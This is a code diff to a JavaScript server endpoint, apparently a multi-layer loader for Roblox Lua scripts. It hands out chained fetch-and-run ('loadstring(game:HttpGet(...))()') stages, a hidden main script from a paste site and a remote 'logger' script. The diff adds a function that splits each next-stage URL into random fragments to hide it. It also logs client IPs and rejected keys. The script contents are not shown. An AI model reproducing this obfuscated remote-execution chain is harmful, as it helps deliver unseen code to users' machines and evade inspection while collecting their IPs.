@@ -4,7 +4,7 @@ const SETTINGS = {
     TOTAL_LAYERS: 5,
     RATE_LIMIT_MS: 10000,
     RATE_LIMIT_MAX: 3,
-    SESSION_TTL: 10000, // session tetap ada 10 detik setelah dipakai
+    SESSION_TTL: 10000,
     PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
     REAL_SCRIPT_URL: "https://pastefy.app/CoG7X467/raw",
     LOGGER_SCRIPT_URL: "https://raw.githubusercontent.com/xvndr4wz/loader-api/refs/heads/main/api/logger/logscript.lua"
@@ -55,6 +55,19 @@ async function sendSecurityLogToLogJs(message, ip, type) {
     });
 }
 
+function obfuscateUrl(url) {
+    const parts = [];
+    let i = 0;
+    while (i < url.length) {
+        const len = Math.floor(Math.random() * 4) + 2;
+        parts.push(url.substring(i, i + len));
+        i += len;
+    }
+    const arrayStr = parts.map(p => `'${p.replace(/'/g, "\\'")}'`).join(',');
+    const concatStr = parts.map((_, idx) => `a[${idx + 1}]`).join('..');
+    return `local a={${arrayStr}}loadstring(game:HttpGet(${concatStr}))()`;
+}
+
 function makeSession(ownerIp, stepSequence, currentIndex) {
     const now = Date.now();
     const ipPart = ownerIp.split('.').pop() || "0";
@@ -77,7 +90,6 @@ function makeSession(ownerIp, stepSequence, currentIndex) {
 function expireSession(id) {
     if (sessions[id]) {
         sessions[id].used = true;
-        // hapus setelah SESSION_TTL agar replay attack masih bisa terdeteksi
         setTimeout(() => delete sessions[id], SETTINGS.SESSION_TTL);
     }
 }
@@ -159,8 +171,7 @@ module.exports = async function(req, res) {
 
             const { newSessionID, nextKey } = makeSession(cleanIp, sequence, 0);
             const nextUrl = "https://" + host + currentPath + "?" + sequence[0] + "." + newSessionID + "." + nextKey;
-            const luaScript = "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
-            return res.status(200).send(luaScript);
+            return res.status(200).send(obfuscateUrl(nextUrl));
         }
 
         // ========== VALIDASI HANDSHAKE ==========
@@ -190,7 +201,16 @@ module.exports = async function(req, res) {
             return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
         }
 
+        // ========== CEK INVALID KEY ==========
         if (session.nextKey !== key) {
+            await sendSecurityLogToLogJs(
+                `🔑 **INVALID KEY DETECTED**\n` +
+                `📡 **IP:** \`${cleanIp}\`\n` +
+                `❌ **Key dikirim:** \`${key}\`\n` +
+                `⚠️ Key tidak cocok`,
+                cleanIp,
+                "invalid_key"
+            );
             expireSession(id);
             return res.status(getRandomError()).send("SECURITY : BANNED ACCESS!");
         }
@@ -200,7 +220,7 @@ module.exports = async function(req, res) {
         // ========== LAYER TERAKHIR (idx = TOTAL_LAYERS-1): MAIN SCRIPT ==========
         if (idx === SETTINGS.TOTAL_LAYERS - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
-            expireSession(id); // tandai used, hapus setelah 10 detik
+            expireSession(id);
             return res.status(200).send(mainScript || '');
         }
 
@@ -209,13 +229,12 @@ module.exports = async function(req, res) {
             const nextIdx = SETTINGS.TOTAL_LAYERS - 1;
             const nextStepNumber = session.stepSequence[nextIdx];
             const { newSessionID, nextKey } = makeSession(session.ownerIP, session.stepSequence, nextIdx);
-            expireSession(id); // tandai used, hapus setelah 10 detik
+            expireSession(id);
 
             const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
 
-            const luaScript = "loadstring(game:HttpGet(\"" + nextUrl + "\"))()\n" +
-                              (loggerScript || '');
+            const luaScript = obfuscateUrl(nextUrl) + "\n" + (loggerScript || '');
             return res.status(200).send(luaScript);
         }
 
@@ -223,11 +242,10 @@ module.exports = async function(req, res) {
         const nextIdx = idx + 1;
         const nextStepNumber = session.stepSequence[nextIdx];
         const { newSessionID, nextKey } = makeSession(session.ownerIP, session.stepSequence, nextIdx);
-        expireSession(id); // tandai used, hapus setelah 10 detik
+        expireSession(id);
 
         const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-        const luaScript = "loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
-        return res.status(200).send(luaScript);
+        return res.status(200).send(obfuscateUrl(nextUrl));
 
     } catch (err) {
         const plainResp = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
